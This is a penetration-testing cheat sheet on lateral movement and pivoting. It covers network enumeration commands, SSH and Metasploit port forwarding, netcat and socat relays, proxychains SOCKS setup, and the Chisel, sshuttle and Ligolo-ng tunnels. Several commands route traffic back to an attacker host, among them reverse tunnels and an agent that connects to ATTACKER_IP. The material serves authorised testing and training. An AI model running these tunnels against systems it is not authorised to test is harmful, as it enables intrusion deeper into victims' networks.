+++
title = "Lateral Movement"
+++

# Network Info

```bash
# Linux
arp -a
cat /etc/hosts
ifconfig
ip a
nmcli dev show
ip r

# Windows
arp -a
type c:\Windows\System32\drivers\etc\hosts
ipconfig /all
netstat -r
```

# Tunneling (Port Forwarding)

## SSH

### Forward

`Local (where SSH is ran from) => Remote (Target)`

```bash
ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> <USER>@<TARGET_2>

ssh -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> \
    -L <LOCAL_PORT>:<TARGET_IP>:<TARGET_PORT> \
    <USER>@<TARGET_2>
```

### Reverse

```bash
ssh -R <REMOTE_IP>:<REMOTE_PORT>:0.0.0.0:<LOCAL_PORT> <USER>@<TARGET> -v
```

## Metasploit

```bash
portfwd list
```

### Forward

```bash
# ATTACKER => REDIR => TARGET
# NOTE: add "-L 0.0.0.0" to make the local port accessible from other machines next to ATTACKER (like a Windows box)
portfwd add -l <ATTACKER_PORT> -r <TARGET_IP> -p <TARGET_PORT> 
```

### Reverse

```bash
# TARGET => REDIR => ATTACKER
portfwd add -R -l <REDIR_PORT> -L <ATTACKER_IP> -p <ATTACKER_PORT>
```

# Redirection

Redirection is simple traffic manipulation on a single host. There are no tunnels.

## Netcat

```bash
# PORT FORWARD 0.0.0.0:<LISTEN_PORT> => <TARGET>:<FORWARD_PORT>
# NOTE: use normal netcat (w/o "-e" or "-c" options)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | nc <TARGET> <FORWARD_PORT> 2>&1 | nc -lvnp <LISTEN_PORT> > /tmp/f
```

## Socat

This can be forward or reverse, with the `TARGET_*` being the ATTACKER or TARGET respectively.

```bash
socat TCP4-LISTEN:<LISTEN_PORT>,fork,reuseaddr TCP4:<TARGET_IP>:<TARGET_PORT>
```

## Netsh

- https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts

```bash
netsh.exe interface portproxy add v4tov4 listenaddress=<LISTEN_IP> listenport=<LISTEN_PORT> connectaddress=<REMOTE_IP> connectport=<REMOTE_PORT>

netsh.exe interface portproxy show v4tov4
```

# Dynamic Forwarding

## SOCKS

- Remember that only proper TCP traffic works with SOCKS (e.g. **NOT** certain scans like `nmap -sS` sends malformed packets or ICMP ping), use `nmap -sT`

```bash
proxychains <COMMAND>

proxychains msfconsole

proxychains nmap -n -Pn -sT -sV -p21,22,23,53,80,135,139,389,443,445,1433,3389,5985,5986,8080 --stats-every 15s --open -v -oA nmap_subnet_discovery <TARGET_SUBNET>
```

### Step 0: Pre-Requisites

```bash
# Edit ProxyChains Config
# NOTE: disable strict_chain to for robustness
ls -la /etc/proxychains*.conf

[ProxyList]
dynamic_chain
#strict_chain
socks5  127.0.0.1 1080  # For Chisel
socks4  127.0.0.1 9050  # For an SSH -D proxy
```
### via SSH

```bash
# Step 1: create proxy via SSH
ssh -D 9050 <USER>@<TARGET>
```

### via Plink

Windows SSH client from PuTTY.
- Proxy Client: https://www.proxifier.com/

```bash
plink -ssh -D 9050 <USER>@<TARGET>

cmd.exe /c echo y | plink.exe -ssh -l <USER> -pw <PASS> <TARGET>
```

### via Metasploit

```bash
# Step 1: Run MSF SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
#set version 5
run -j
jobs

# Step 2a: in MSF
use post/multi/manage/autoroute
set SESSION <SESSION>
set SUBNET <TARGET_SUBNET>
run -j
jobs
route print

# OR Step 2b: in MSF session
run autoroute -s <TARGET_SUBNET>
run autoroute -p
```

## Sshuttle

"Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin... Supports DNS tunneling."
- https://github.com/sshuttle/sshuttle

```bash
sudo apt install -y sshuttle
# NOTE: -x excludes the pivot IP to avoid routing issues
sudo sshuttle -r <USER>@<TARGET> --ssh-cmd "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null" -x <PIVOT_IP> -v <TARGET_SUBNET>
```

## Chisel

"Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH"
- https://github.com/jpillora/chisel

**NOTE:** configure [[lateral-movement#Step 0 Pre-Requisites]] and **SOCKS5 w/ port 1080**

```bash
### LINUX
# DYNAMIC
git clone https://github.com/jpillora/chisel.git && cd chisel && go build
# STATIC
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -o chisel_static

### WINDOWS
# 64-bit
CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o chisel.exe
# 32-bit
CGO_ENABLED=0 GOOS=windows GOARCH=386 go build -ldflags="-s -w" -o chisel32.exe

### SHRINK (10MB -> 3MB)
upx --brute chisel*
```

### Forward

```bash
# REDIR
./chisel server --socks5 -v -p <LISTEN_PORT>

./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> 1080:socks
```

### Reverse

```bash
# ATTACKER
./chisel server --socks5 --reverse -v -p <LISTEN_PORT>

# REDIR
./chisel client -v <CHISEL_SERVER>:<LISTEN_PORT> R:1080:socks
```

## Ligolo-ng

- https://docs.ligolo.ng/Quickstart/

```bash
# ATTACKER
sudo ./proxy -selfcert

# CLIENT
./agent -connect <ATTACKER_IP>:11601 -ignore-cert

# ATTACKER: ligolo session
session 1
start

# Back in Kali terminal
sudo ip route add <SUBNET_TARGET> dev ligolo
```